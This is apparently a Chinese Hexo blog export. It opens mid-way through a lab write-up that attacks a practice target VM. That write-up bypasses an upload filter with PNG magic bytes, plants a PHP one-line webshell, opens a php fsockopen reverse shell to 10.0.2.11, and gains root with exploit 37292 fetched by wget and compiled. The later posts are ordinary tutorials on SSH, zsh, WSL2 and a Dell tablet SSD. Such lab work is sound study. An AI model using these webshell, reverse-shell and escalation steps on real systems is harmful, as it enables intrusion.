title="三、尝试反弹shell"></a>三、尝试反弹shell</h2><p>登陆上这个网页后，发现这个网站有上传图片的功能，很容易想到有可能可以利用的任意文件上传漏洞，先尝试直接上传<code>.php</code>文件，发现它会检查文件类型，将后缀名修改后也不能传输成功。说明网站不只是简单地进行了后缀名的检测，故尝试修改文件头来通过检测。将文件头的十六进制修改为<code>89504e470d0a1a0a</code>发现成功：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/770356d662f44b87159678359834e39c.png" alt="上传文件"></p><ul><li><p>思路一：<br>复制文件路径找到了<code>uploaded_images</code>的文件路径，拦截<code>show images</code>的请求，发现了命令执行漏洞，将load路径改为<code>uploaded_images/test.png</code>并修改<code>test.png</code>文件内容为<code>php-reverse-shell</code>文件的内容并重新上传，在终端中输入<code>nc -nvlp 1234</code>监听1234端口(<code>php-reverse-shell</code>文件中的ip地址和端口也要进行相应的修改)发现反弹shell成功：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/657b7cee052a9e8f40225abacc5b48d7.png" alt="反弹成功1"></p></li><li><p>思路二：<br>使用一句话木马以能在网站上运行命令，将<code>test.png</code>文件中的内容改为<code>&lt;?php system($_POST[‘cmd’]);?&gt;</code>，这个时候在拦截的POST请求的末尾加上<code>&amp;cmd=ls</code>，这个时候发现输出了文件目录中的内容，说明网站并没有限制一些敏感的参数。故将<code>php -r &#39;$sock=fsockopen(&quot;10.0.2.11&quot;,1234);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code>先编码为url格式再复制到<code>&amp;cmd=</code>后面，发现反弹shell成功：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/8b14422e0a5b452ef833e53bbe2ebc3c.png" alt="反弹成功2"></p></li></ul><h2 id="四、获取靶机root权限"><a href="#四、获取靶机root权限" class="headerlink" title="四、获取靶机root权限"></a>四、获取靶机root权限</h2><p>如果在之前查看了<code>/in</code>网页，很容易就可以发现靶机的内核信息过低：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/97c7819de7a0154dc34e75fa3317bee5.png" alt="内核信息"></p><p>如果查看<code>/in</code>网页也没有太大关系，输入以下命令可以查看靶机的内核版本以及发行版版本等各详细信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a <span class="comment">#查看内核信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/*-release <span class="comment">#查看发行版版本等其他信息</span></span><br></pre></td></tr></table></figure><p>接下来的事情就比较简单了，输入以下命令来完成内核漏洞的爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在主机上：</span></span><br><span class="line">searchsploit privilege | grep 3.13 | grep linux <span class="comment">#查找可以利用的内核漏洞，发现编号为37292的文件</span></span><br><span class="line">searchsploit -m 37292 <span class="comment">#将该文件下载到本机</span></span><br><span class="line">python -m http.server:80 <span class="comment">#开启http服务方便靶机从主机下载文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在靶机上</span></span><br><span class="line"><span class="built_in">which</span> gcc <span class="comment">#检查运行环境，发现靶机有gcc工具，故不用管</span></span><br><span class="line">wget 10.0.2.11/37292.c <span class="comment">#从靶机上获取漏洞文件</span></span><br><span class="line">gcc 37292.c -o 37292 <span class="comment">#将.c文件编译链接为可执行文件</span></span><br><span class="line">./37292 <span class="comment">#执行文件来获得root权限</span></span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/49f523a8a93acf84df4012daf153be56.png" alt="结果"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 网络攻防 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过ssh连接VirtualBox的nat网络模式下的虚拟机</title>
      <link href="/post/46d9de96.html"/>
      <url>/post/46d9de96.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：因为这学期要上传奇史课os，课程要求使用OpenEuler系统，为了方便用vscode编程使用了ssh来连接虚拟机。折腾的过程中发现桥接模式会随着你网络环境他的变化而产生网段的变化导致ssh配置发生变动，而nat模式下的虚拟机ip不会产生改变。而使用nat网络模式来进行连接相对麻烦一点儿，故有了该文章。</p><h2 id="一、设置端口转发"><a href="#一、设置端口转发" class="headerlink" title="一、设置端口转发"></a>一、设置端口转发</h2><p>因为nat模式下尽管虚拟机ping得通主机，但是主机ping不通虚拟机的话ssh连接仍然是不可行的，所以必须要先进行端口转发。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/faf3354a84b2e246498fc6d54d9b36a3.png" alt="ping不通"><br>设置端口转发也非常简单，首先点击VirtualBox左上角的<strong>管理</strong>，选择其中的<strong>工具</strong>，在工具的菜单栏中选择<strong>网络管理器</strong>。或者是直接使用快捷键<code>Ctrl+H</code>打开。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/2025-03-02211905.png" alt="网络管理器"><br>之后先点开<strong>属性</strong>，选择<strong>NAT网络</strong>，在下方选择<strong>端口转发</strong>，点击右边的”+“添加新规则。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/696a0650dd9826ab8672748c8fb4952e.png" alt="端口转发"><br>主机ip和子系统端口和上图保持一致，除非你ssh端口自定义了非22端口。主机端口可以自己改动，只要该端口没有被占用就行。需要注意的是子系统ip要和你的虚拟机保持一致。至于如何获得子系统的ip，需要打开子系统输入命令<code>ip addr</code>来查看，一般如果你没有进行特别的修改，ip都应该为<code>10.0.2.xx</code>。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/0959d4c2d5f800fd252dcea6d92442ac.png" alt="子系统ip"><br>输入好后，点击右下角的应用开始转发。</p><h2 id="二、虚拟机的准备"><a href="#二、虚拟机的准备" class="headerlink" title="二、虚拟机的准备"></a>二、虚拟机的准备</h2><p>要想进行ssh连接，你的虚拟机必须要开启sshd服务，关于如何安装sshd服务请左转自行谷歌。<br>输入以下命令来设置ssh服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> sshd <span class="comment">#启用sshd开机自启动</span></span><br><span class="line">systemctl start sshd <span class="comment">#启用sshd服务</span></span><br><span class="line">systemctl status sshd <span class="comment">#查看sshd服务状态</span></span><br></pre></td></tr></table></figure><p>最后你的sshd服务状态应该类似于下图：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/aeff68d211b9570b69abd352cbb28854.png" alt="sshd-status"></p><h2 id="三、ssh相关设置"><a href="#三、ssh相关设置" class="headerlink" title="三、ssh相关设置"></a>三、ssh相关设置</h2><ul><li><p>测试连接<br>现在在确保虚拟机开着的情况下可以进行ssh的连接了。在cmd中输入以下命令<code>ssh -p 你设置的主机端口号 username(你想用什么身份登陆你的虚拟机)@127.0.0.1</code>来测试连接，若提示你输入密码进行登录则说明连接成功。</p></li><li><p>配置密钥登录<br>如果不配置密钥，在vscode中打开一个文件夹就要输入一次密码，极其的麻烦。而且以后工作的时候肯定是使用安全的密钥登录，所以用密钥登陆是很有必要的。</p><ul><li><p>在cmd输入命令<code>ssh-keygen -t rsa -b 4096</code>生成一对rsa密钥(之后一直回车即可)，如果你之前已经生成了密钥了，那就用你之前的密钥就行。</p></li><li><p>进入<code>C/Users/你的用户名/.ssh</code>文件夹，你应该在这里能找到你之前生成的密钥对。在这里右键打开terminal，输入命令<code>scp -P 你设置的主机端口号 id_rsa.pub username@127.0.0.1:~(可以改成你想要的目录)</code>，这一步是将公钥文件传给你的虚拟机。</p></li><li><p>打开你的虚拟机，找到你传入的公钥文件，输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cat</span> id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></li></ul></li><li><p>最后是对sshd的一些配置<br>修改<code>/etc/ssh/sshd_config</code>文件，将对应行修改成下面那样：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin prohibit-password #限制不能使用密码登录root用户</span><br><span class="line">PubkeyAuthentication yes #允许使用公钥进行登录</span><br><span class="line">PasswordAuthentication no #禁止使用密码登录</span><br><span class="line">AllowTcpForwarding yes #允许进行ssh端口的tcp转发</span><br></pre></td></tr></table></figure></li></ul><p>之后再进行ssh连接，你会发现直接连接成功，最后在vscode输入之前的ssh连接命令即可成功远程登陆虚拟机。</p><h2 id="四、踩过的坑"><a href="#四、踩过的坑" class="headerlink" title="四、踩过的坑"></a>四、踩过的坑</h2><p>因为我之前已经有了rsa密钥，我把生成的新的rsa密钥命名成了自定义的名字，然后发现怎么都连接不成功。搜索后发现原来ssh会按照一定顺序扫描已有的私钥，而自定义名字的私钥是最后扫描的，导致ssh在扫描到之前就认为你的私钥已经是错误的了(居然不是遍历！！！)。<br>这种情况需要在ssh连接命令中加入参数<code>-i</code>来指定你要使用的私钥来进行连接。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ssh </tag>
            
            <tag> 虚拟机 </tag>
            
            <tag> VirtualBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zsh的安装和简单配置</title>
      <link href="/post/88f7f195.html"/>
      <url>/post/88f7f195.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：本教程使用的是WSL2(Debian系统)，使用ArchLinux系或者RedHat系的操作系统可能在下面的操作中有些许不同之处。zsh有比bash更加丰富的扩展功能，在可自定义化和补全功能上都比bash要强大很多<del>(最重要的是zsh比bash的prompt好看多了)</del>。</p><h2 id="一、下载zsh并设置其为默认shell"><a href="#一、下载zsh并设置其为默认shell" class="headerlink" title="一、下载zsh并设置其为默认shell"></a>一、下载zsh并设置其为默认shell</h2><ul><li>下载zsh<br>下载zsh非常之简单，很多版本的Linux都提供了zsh的预编译包，可以通过系统的包管理器安装。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install zsh</span><br></pre></td></tr></table></figure><p>如果你的Linux使用的是其他包管理工具，比如yum或是pacman，请自行查找教程。</p><ul><li><p>将zsh设置为默认shell<br>首先要检查zsh是否安装成功，输入命令<code>zsh --version</code>后如果有类似于下面的输出，那说明安装成功了。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post3/dd48fdedf7063619e1708387b1d60e71.png" alt="zsh-version"><br>之后就是输入命令让zsh成为默认shell。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /usr/bin/zsh</span><br></pre></td></tr></table></figure></li></ul><p>至此，zsh的下载安装已经完毕。</p><h2 id="二、下载oh-my-zsh并进行插件和主题的配置"><a href="#二、下载oh-my-zsh并进行插件和主题的配置" class="headerlink" title="二、下载oh-my-zsh并进行插件和主题的配置"></a>二、下载oh-my-zsh并进行插件和主题的配置</h2><p>oh-my-zsh是一个开源的zsh配置管理框架，旨在帮助用户快速上手zsh，并通过丰富的插件和主题让命令行体验更加高效、美观和个性化。<del>(上述内容由ai生成)</del></p><ul><li><p>下载oh-my-zsh<br>如果你在国内，可以使用gitee的镜像</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>  如果你在国外或者就是想用github，使用以下命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>下载powerlevel10k<br>powerlevel10k是一个自定义化程度相当之高且方便使用的主题配置工具，和上面的一样，可以选择从github或者gitee来下载：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://gitee.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure><p>  下载完毕之后，编辑<code>~/.zshrc</code>文件，找到以下行并修改：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME=&quot;主题名称&quot;</span><br><span class="line">#修改为：ZSH_THEME=&quot;powerlevel10k/powerlevel10k&quot;</span><br></pre></td></tr></table></figure><p>  保存并退出后执行命令<code>source ~/.zshrc</code>后会让你自定义prompt外观。<br>  如果你之后又想进行外观的修改，可以输入命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p10k configure</span><br></pre></td></tr></table></figure></li><li><p>下载两个常用插件<br>先编辑<code>~/.zshrc</code>文件，找到以下行并修改：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plugins=(git) </span><br><span class="line">#修改为：plugins=(git zsh-autosuggestions zsh-syntax-highlighting)</span><br></pre></td></tr></table></figure><p>  然后下载两个插件：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions.git ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>  最后仍然是执行命令<code>source ~/.zshrc</code>使插件生效。</p></li></ul><p>以上就是zsh的安装和简单的配置，放一个我配置完的zsh的效果图：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post3/95f4d3600abefc9525dc9d907f96f21f.png" alt="zsh-example"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 教程 </tag>
            
            <tag> zsh </tag>
            
            <tag> 美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSL2的安装和简单配置</title>
      <link href="/post/87099e43.html"/>
      <url>/post/87099e43.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：本教程使用的是Windows11的系统，不保证Windows10也适用。</p><h2 id="一、为Windows启用Hyper-v虚拟化"><a href="#一、为Windows启用Hyper-v虚拟化" class="headerlink" title="一、为Windows启用Hyper-v虚拟化"></a>一、为Windows启用Hyper-v虚拟化</h2><ul><li><p>按下win键，打开开始菜单，在搜索框中搜索<code>powershell</code>并按下右键选择以管理员身份运行。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/0865930a85e7def3f66138ae61450941.png" alt="展示"></p></li><li><p>输入命令来执行虚拟化操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName $(<span class="string">&quot;Microsoft-Windows-Subsystem-Linux&quot;</span>,<span class="string">&quot;VirtualMachinePlatform&quot;</span>)</span><br></pre></td></tr></table></figure><p>  此操作需要重启，若询问是否立即重启执行操作，输入Y并按下回车键即可。</p></li></ul><h2 id="二、设置WSL2默认版本为version2"><a href="#二、设置WSL2默认版本为version2" class="headerlink" title="二、设置WSL2默认版本为version2"></a>二、设置WSL2默认版本为version2</h2><p>在之前的管理员powershell界面输入<code>wsl --set-default-version 2</code>即可，之后可以输入<code>wsl -v</code>来确定版本。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/168383ad282389c72db900a0869ef219.png" alt="wsl版本"><br>现在win11默认的wsl版本就是2，此操作也可以不做。</p><h2 id="三、下载Linux发行版"><a href="#三、下载Linux发行版" class="headerlink" title="三、下载Linux发行版"></a>三、下载Linux发行版</h2><h3 id="方案一：通过Microsoft-Store来进行下载"><a href="#方案一：通过Microsoft-Store来进行下载" class="headerlink" title="方案一：通过Microsoft Store来进行下载"></a>方案一：通过Microsoft Store来进行下载</h3><p>通过微软商店来下载非常简单，只需要在微软商店搜索对应的Linux发行版的名字即可进行下载。比如这里以下载ubuntu为例：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/d573d3eb16225db1e4a8dcf3c017d7b4.png" alt="Ubuntu"></p><h3 id="方案二：通过命令行来进行安装-推荐"><a href="#方案二：通过命令行来进行安装-推荐" class="headerlink" title="方案二：通过命令行来进行安装(推荐)"></a>方案二：通过命令行来进行安装(推荐)</h3><ul><li>使用<code>wsl -l -o</code>命令来查看当前可用的发行版。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/6b3a505f144d94c59fe6fb4d9589e697.png" alt="可用列表"></li><li>使用<code>wsl --install -d &lt;distribution name&gt;</code>命令来下载指定的Linux发行版，这里的distribution name就是指上面那个操作中的第一列列出来的名称。</li></ul><p>等待耐心下载完并弹出相应提示之后，安装过程就完成了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输出类似如下信息则启动成功</span></span><br><span class="line">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.153.1-microsoft-standard-WSL2 x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br></pre></td></tr></table></figure><h2 id="四、-wslconfig文件设置"><a href="#四、-wslconfig文件设置" class="headerlink" title="四、.wslconfig文件设置"></a>四、.wslconfig文件设置</h2><ul><li><p>进入<code>C:/Users/Username/</code>目录，如果当前目录不存在名为<code>.wslconfig</code>的文件，则手动创建一个。</p></li><li><p>用记事本打开<code>.wslconfig</code>文件并输入以下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[experimental]</span><br><span class="line">autoMemoryReclaim=gradual  </span><br><span class="line">networkingMode=mirrored</span><br><span class="line">dnsTunneling=<span class="literal">true</span></span><br><span class="line">firewall=<span class="literal">true</span></span><br><span class="line">autoProxy=<span class="literal">true</span></span><br></pre></td></tr></table></figure></li></ul><p>这个操作之后可以使用<code>ip addr</code>命令查看ip地址并和在<code>powershell</code>中输入<code>ipconfig</code>后的地址进行对比，如若一样则网络模式修改成功。此外，上面的功能是Windows内部版本19041及更高版本中作为wsl2运行的发行版特有的，可以自行去看官网以了解更多功能<a href="https://learn.microsoft.com/en-us/windows/wsl/wsl-config#configuration-options">WSL配置</a>。</p><h3 id="clash接管wsl2网络"><a href="#clash接管wsl2网络" class="headerlink" title="clash接管wsl2网络"></a>clash接管wsl2网络</h3><p>让clash接管wsl的网络，需要先在clash中打开<code>Allow LAN</code>功能。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/clash1.png" alt="clash"></p><h4 id="方案一-你能使用wsl2的实验性功能"><a href="#方案一-你能使用wsl2的实验性功能" class="headerlink" title="方案一(你能使用wsl2的实验性功能)"></a>方案一(你能使用wsl2的实验性功能)</h4><p>确保上述的操作无误，输入<code>wget www.google.com</code>来确认clash确实已经接管了wsl的网络(此操作需要在Linux的不需要root写权限的目录下进行)。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget www.google.com</span><br><span class="line"></span><br><span class="line">--2025-01-21 22:18:49--  http://www.google.com/</span><br><span class="line">Connecting to 127.0.0.1:7890... connected.</span><br><span class="line">Proxy request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [text/html]</span><br><span class="line">Saving to: ‘index.html’</span><br><span class="line"></span><br><span class="line">index.html                        [ &lt;=&gt;                                              ]  19.35K  --.-KB/s    <span class="keyword">in</span> 0.05s</span><br><span class="line"></span><br><span class="line">2025-01-21 22:18:49 (376 KB/s) - ‘index.html’ saved [19818]</span><br></pre></td></tr></table></figure><h4 id="方案二-你不能使用wsl2的实验性功能"><a href="#方案二-你不能使用wsl2的实验性功能" class="headerlink" title="方案二(你不能使用wsl2的实验性功能)"></a>方案二(你不能使用wsl2的实验性功能)</h4><p>这里借鉴了某<a href="https://eastmonster.github.io/2022/10/05/clash-config-in-wsl/">大神</a>的方案，若你的wsl版本或者windows版本不能使用上面的配置，将<code>.wslconfig</code>中的内容改为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[wsl2]</span><br><span class="line">dnsTunneling=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>之后编辑Linux根目录下的<code>.bashrc</code>文件，加入以下三行内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">host_ip=$(<span class="built_in">cat</span> /etc/resolv.conf |grep <span class="string">&quot;nameserver&quot;</span> |<span class="built_in">cut</span> -f 2 -d <span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://<span class="variable">$host_ip</span>:[端口]&quot;</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://<span class="variable">$host_ip</span>:[端口]&quot;</span></span><br></pre></td></tr></table></figure><p>这里的端口就是clash的port，如上面我的截图中clash的端口是7890(一般默认就是7890)。完成后输入<code>source ~/.bashrc</code>来让配置生效，可以输入<code>echo $http_proxy</code>来验证是否成功。</p><h2 id="五、更换软件源"><a href="#五、更换软件源" class="headerlink" title="五、更换软件源"></a>五、更换软件源</h2><p>根据你使用的Linux发行版直接上网搜索相应的镜像源即可，这里给出一个汇总链接<a href="https://segmentfault.com/a/1190000000375848">镜像源</a>。复制相应的镜像源后，直接进行修改即可。这里以debian12更换清华源为例。</p><ul><li><p>访问<a href="https://mirrors.tuna.tsinghua.edu.cn/help/debian/">debian清华镜像源</a>(网址中的debian可换成你的Linux发行版)并复制软件源。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换</span></span><br><span class="line">deb https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware</span></span><br></pre></td></tr></table></figure></li><li><p>备份文件并修改文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份源文件</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.backup</span><br><span class="line"><span class="comment"># 修改文件</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">touch</span> /etc/apt/sources.list</span><br><span class="line"><span class="built_in">sudo</span> vi /etc/apt/sources.list <span class="comment"># 将复制内容粘贴进去 </span></span><br></pre></td></tr></table></figure><p>相信vim操作就不用教了吧，这里也可以使用你更熟悉的编辑器进行修改。</p></li></ul><p>最后输入<code>sudo apt update</code>和<code>sudo apt upgrade</code>命令即可验证软件源是否修改成功。</p>]]></content>
      
      
      
        <tags>
            
            <tag> WSL2 </tag>
            
            <tag> Windows11 </tag>
            
            <tag> Linux </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DELL Latitude 5290 2in1扩展硬盘避坑</title>
      <link href="/post/4a17b156.html"/>
      <url>/post/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>PS：写这篇文章的原因是我在扩展这个平板的硬盘时就踩过坑，而且关于这台平板的文章在网上非常少且有些错误的地方。</p><p>自从需要带着电脑出去干活的频率升高后就一直想搞个win平板玩玩，主要是方便带着出门加轻度办公<del>（其实主要原因是方便玩旮旯给木）</del>。为什么要选择傻多戴呢，无他，就是因为可以扩展硬盘而且二手也不贵（某鱼上1000多一点带键盘拿下，基本上是全新）。</p><h2 id="关于硬盘位"><a href="#关于硬盘位" class="headerlink" title="关于硬盘位"></a>关于硬盘位</h2><p>关于大家最关心的扩展位硬盘的问题，这个硬盘位是wwan口，<strong>不支持sata协议，只支持nvme协议 pcie3.0，并且需要双缺口（B&amp;M key）的硬盘才能插得进去</strong>。规格我选择的是2242的（是短硬盘，平时大家看得多的长硬盘是2280规格的），2230的没试过，貌似也是可以的（别人有成功过）。根据硬盘的螺丝定位口来看，2242是刚刚好的。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post1/ae270d110612862760e6b359d714f10a429931853.jpg" alt="硬盘展示"></p><h2 id="速度"><a href="#速度" class="headerlink" title="速度"></a>速度</h2><p>测速大家自己看吧<del>（主硬盘位商家给了一根sata协议的好黑心）</del><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post1/e29d3ea9d3e14ea0f3912cba53f352ac429931853.png" alt="测速展示"></p><p>在这里纠正一点，在别的文章有看到过把ngff和nvme放在一起说的，而实际上ngff和nvme不是并列关系，ngff（Next Generation Form Factor）就是m.2的前称，而nvme是一种传输协议。</p>]]></content>
      
      
      
        <tags>
            
            <tag> DELL </tag>
            
            <tag> 搞机 </tag>
            
            <tag> win平板 </tag>
            
            <tag> 避坑 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
